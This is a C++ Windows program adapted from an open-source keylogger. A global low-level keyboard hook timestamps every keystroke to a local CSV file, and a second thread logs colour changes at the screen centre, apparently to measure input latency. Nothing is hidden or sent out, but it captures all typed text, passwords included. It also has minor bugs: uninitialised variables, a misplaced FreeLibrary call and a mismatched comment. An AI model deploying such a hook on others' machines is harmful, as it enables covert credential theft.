/*
Adapted from GiacomoLaw/Keylogger
*/

#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <chrono>
#include <map>
#include <thread>
#include <math.h>

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

const std::map<int, std::string> keyname{
		{VK_BACK, "[BACKSPACE]"},
		{VK_RETURN, "[RETURN]"},
		{VK_SPACE, " "}, // Space
		{VK_TAB, "[TAB]"},
		{VK_SHIFT, "[SHIFT]"},
		{VK_LSHIFT, "[LEFT_SHIFT]"},
		{VK_RSHIFT, "[RIGHT_SHIFT]"},
		{VK_CONTROL, "[CONTROL]"},
		{VK_LCONTROL, "[LEFT_CONTROL]"},
		{VK_RCONTROL, "[RIGHT_CONTROL]"},
		{VK_MENU, "[ALT]"},
		{VK_LWIN, "[LEFT_WIN]"},
		{VK_RWIN, "[RIGHT_WIN]"},
		{VK_ESCAPE, "[ESCAPE]"},
		{VK_END, "[END]"},
		{VK_HOME, "[HOME]"},
		{VK_LEFT, "[LEFT]"},
		{VK_RIGHT, "[RIGHT]"},
		{VK_UP, "[UP]"},
		{VK_DOWN, "[DOWN]"},
		{VK_PRIOR, "[PG_UP]"},
		{VK_NEXT, "[PG_DOWN]"},
		{VK_OEM_PERIOD, "."},
		{VK_DECIMAL, "."},
		{VK_OEM_PLUS, "+"},
		{VK_OEM_MINUS, "-"},
		{VK_ADD, "+"},
		{VK_SUBTRACT, "-"},
		{VK_CAPITAL, "[CAPSLOCK]"},
};
int keysInputCounter = 0;
int colorsInputCounter = 0;
HHOOK _hook;

typedef WINAPI COLORREF (*GETPIXEL)(HDC, int, int);

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file_keys;
std::ofstream output_file_colors;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		std::cout << "Failed to install hook!" << std::endl;
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	std::stringstream output;
	HKL layout = NULL;

	if (key_stroke == VK_RETURN)
	{
		// If Numpad 0 is hit, reset the counter for easy data comprehension
		keysInputCounter = 0;
		colorsInputCounter = 0;
	}

	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
	// get time
	unsigned long long now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
	// instead of opening and closing file handlers every time, keep file open and flush.
	output_file_keys << now << "," << output.str() << "," << keysInputCounter++ << ",windows" << std::endl;
	output_file_keys.flush();

	std::cout << output.str();

	return 0;
}

void colorThread()
{
	// Load library for reading pixels
	HINSTANCE _hGDI = LoadLibrary("gdi32.dll");

	double prev_r, prev_g, prev_b = 0;
	if (_hGDI)
	{
		while (true)
		{
			GETPIXEL pGetPixel = (GETPIXEL)GetProcAddress(_hGDI, "GetPixel");
			HDC _hdc = GetDC(NULL);
			if (_hdc)
			{
				// get center of screen
				int x = GetSystemMetrics(SM_CXSCREEN) / 2;
				int y = GetSystemMetrics(SM_CYSCREEN) / 2;
				// get color of pixel at center of screen
				COLORREF color = (*pGetPixel)(_hdc, x, y);
				int _red = GetRValue(color);
				int _green = GetGValue(color);
				int _blue = GetBValue(color);

				double colorDistance = sqrt(pow(_red - prev_r, 2) + pow(_green - prev_g, 2) + pow(_blue - prev_b, 2));

				if (colorDistance > 10)
				{
					// get time
					unsigned long long now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
					output_file_colors << now << ",[Color Change: " << _red << " " << _green << " " << _blue << "]" << "," << colorsInputCounter++ << ",windows" << std::endl;
					output_file_colors.flush();
					// std::cout << "Color: " << _red << "," << _green << "," << _blue << std::endl;
					prev_r = _red;
					prev_g = _green;
					prev_b = _blue;
				}
			}
			FreeLibrary(_hGDI);
		}
	}
}

int main()
{
	// open output file in append mode
	const char *output_filename_keys = "datalogger_keys_windows.csv";
	std::cout << "Logging output to " << output_filename_keys << std::endl;
	output_file_keys.open(output_filename_keys, std::ios_base::app);

	const char *output_filename_colors = "datalogger_colors_windows.csv";
	std::cout << "Logging output to " << output_filename_colors << std::endl;
	output_file_colors.open(output_filename_colors, std::ios_base::app);

	// set the hook
	SetHook();

	//Start reading color
	std::thread t1(colorThread);

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
	t1.join();
}
